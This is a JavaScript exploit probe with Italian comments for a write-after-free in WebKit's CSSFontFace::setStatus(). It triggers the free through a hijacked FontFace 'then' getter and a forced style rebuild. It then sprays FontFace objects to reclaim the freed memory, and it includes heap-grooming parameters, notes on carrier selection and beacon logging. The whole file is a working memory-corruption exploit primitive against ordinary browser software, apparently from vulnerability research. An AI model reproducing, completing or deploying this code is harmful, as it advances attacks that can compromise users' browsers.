// p601-fontface-status-writeback — CSSFontFace::setStatus() write-after-free, letto come oracolo di SCRITTURA
//
// Meccanismo (sorgente 1400):
//   CSSFontSelector::addFontFaceRule ricrea la CSSFontFace della stessa regola e la ADOTTA
//     (CSSFontSelector.cpp:235) -> FontFace::adopt (FontFace.cpp:322-329) droppa il Ref vecchio
//     -> refcount 0 -> ~CSSFontFace -> free, DENTRO il getter.
//   setStatus continua: m_status = newStatus (CSSFontFace.cpp:595) e' un WRITE su memoria liberata,
//     a +0x82, valore 3 (Status::Success). Succede DOPO iterateClients (:591-593), cioe' dopo il getter.
//
// Perche' e' un oracolo di scrittura e non di lettura: dopo adopt() m_backing punta alla face NUOVA,
// quindi style/family leggono un oggetto vivo. L'unico riferimento alla vecchia e' il frame C++.
// (Da qui: il vecchio oracle "scrivi 66 e rileggilo" non puo' funzionare, l'engine scrive 3 lui.)
//
// Forma:
//   - <style id=fs> con la regola @font-face INTATTO: lookUpByCSSConnection confronta il puntatore
//     StyleRuleFontFace, quindi il foglio non va riscritto;
//   - <style id=ds> secondario, sporcato DENTRO il getter, poi offsetHeight -> Reconstruct ->
//     addFontFaceRule -> remove + adopt -> free;
//   - face.loaded acceduto PRIMA (registra la DeferredPromise: senza, resolve() e' un no-op e il
//     getter non scatta dentro setStatus);
//   - face.load() DIRETTO: FontFaceSet::load() tiene un reference_wrapper e dopo la free rilegge
//     status()/wrapper() sull'oggetto liberato.
//
// Carrier: solo un'altra CSSFontFace (classe bitfit 192). ArrayBuffer e' Gigacage (heap separata);
// StringImpl di classe 192 azzera m_thread a +0xB0 e muore sulla RELEASE_ASSERT di Timer.cpp:469.
//
// Riempimento prima del trigger: senza, il primo avvio di una scheda nuova crasha sempre (pagina quasi
// vuota -> decommit). Con fill=80 e' verde su primi avvii consecutivi. Lo spray va dimensionato almeno al
// doppio dell'indice osservato: con n=64 l'hit cadeva a 62 e le run morivano prima.
//
// Arm:            ?ctl=1   nessun offsetHeight, nessuna free -> HIT none
//                 ?swap=1  font-display:swap, nessun timer avviato (il getter vede TimedOut = 'error')
//                 ?fill= ?n= ?wm=  parametri

(function () {
    'use strict';

    var QS = location.search;
    function q(n, d) { var m = new RegExp('[?&]' + n + '=([^&]*)').exec(QS); return m ? m[1] : d; }

    var CTL = q('ctl', '0') === '1', SWAP = q('swap', '0') === '1';
    var FILL = parseInt(q('fill', '80'), 10) || 0;
    var N = parseInt(q('n', '160'), 10) || 160;
    var WM = parseInt(q('wm', '40'), 10) || 0;

    var out = document.createElement('pre'); out.id = 'p601-out'; document.body.appendChild(out);
    var vd = document.createElement('div'); vd.id = 'p601-v';
    vd.style.cssText = 'position:sticky;top:0;z-index:9;font:700 15px -apple-system,sans-serif;padding:.5rem .7rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a';
    vd.textContent = 'RUN'; document.body.appendChild(vd);

    var BASE = location.protocol + '//' + location.host;
    function B(t, d) {
        try {
            var x = new XMLHttpRequest();
            var u = BASE + '/beacon/P601-' + t + '?t=' + Date.now()
                + (d !== undefined ? '&d=' + encodeURIComponent(String(d).slice(0, 300)) : '');
            x.open('GET', u, true); x.send();
        } catch (e) {}
        out.textContent += '\n' + t + ' ' + (d === undefined ? '' : d);
    }
    function verdict(k, t) {
        vd.style.background = k === 'ok' ? '#e3f5e6' : (k === 'bad' ? '#fde2e1' : '#e8f0fe');
        vd.textContent = t;
    }

    var fs = document.createElement('style'); fs.id = 'fs';
    fs.textContent = '@font-face { font-family: s2; src: local(Arial); unicode-range: U+0043;'
        + (SWAP ? ' font-display: swap;' : '') + ' }';
    document.head.appendChild(fs);
    var ds = document.createElement('style'); ds.id = 'ds'; ds.textContent = 'body { margin: 0; }';
    document.head.appendChild(ds);

    var target = null, fired = false, spray = [], warms = [];

    function fill(n) {
        for (var i = 0; i < n; i++) {
            try { document.fonts.add(new FontFace('wf' + i, "local('ZZZZZ_WF_" + i + "')")); } catch (e) {}
        }
        var c = [];
        for (var j = 0; j < 156; j++) c[j] = 0;
        for (var k = 0; k < WM; k++) { try { warms.push(String.fromCharCode.apply(null, c)); } catch (e) {} }
    }

    function scan() {
        for (var i = 0; i < spray.length; i++) {
            var st = ''; try { st = String(spray[i].status); } catch (e) { st = '?'; }
            if (st !== 'unloaded' && st !== 'pending') {
                var fam = '?'; try { fam = String(spray[i].family); } catch (e) {}
                if (fam === 'zz' + i) return i + ':' + st + ':' + fam;
            }
        }
        return 'none';
    }

    function run() {
        var all = [];
        try { document.fonts.forEach(function (f) { all.push(f); }); } catch (e) {}
        for (var i = 0; i < all.length; i++) { try { if (all[i].family === 's2') { target = all[i]; break; } } catch (e) {} }
        if (!target) { B('NOFACE', all.length); verdict('bad', 'noface'); return; }
        all = null;

        fill(FILL);
        void target.loaded;                                  // DeferredPromise: senza, resolve() non fa nulla
        B('READY', 'st=' + String(target.status) + '&fill=' + FILL);

        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get: function () {
                if (fired) return undefined;
                fired = true;
                B('THEN', 'same=' + (this === target) + '&st=' + String(this.status));
                if (CTL) { B('CTL', 'no-free'); return undefined; }
                try { ds.textContent = 'body { margin: 1px; }'; } catch (e) {}
                try { document.body.offsetHeight; } catch (e) {}     // rebuild => adopt => FREE
                for (var k = 0; k < N; k++) {
                    try {
                        var f = new FontFace('zz' + k, "local('ZZZZZ_NoFont_" + k + "')");
                        document.fonts.add(f); spray.push(f);
                    } catch (e) {}
                }
                B('SPRAYED', spray.length);
                return undefined;
            },
            set: function () {}
        });

        try { target.load(); } catch (e) { B('LOADERR', 'x'); }
        B('AFTERLOAD', 'ok');

        var r = scan();
        B('HIT', r);
        verdict(r === 'none' ? 'bad' : 'ok', r);
        setTimeout(function () { B('HIT2', scan()); }, 200);
    }

    B('BOOT', 'ctl=' + (CTL ? 1 : 0) + '&swap=' + (SWAP ? 1 : 0) + '&fill=' + FILL + '&n=' + N + '&wm=' + WM + '&r=' + q('r', '-'));
    verdict('run', 'RUN');
    try { document.body.offsetHeight; } catch (e) {}
    setTimeout(run, 20);
})();
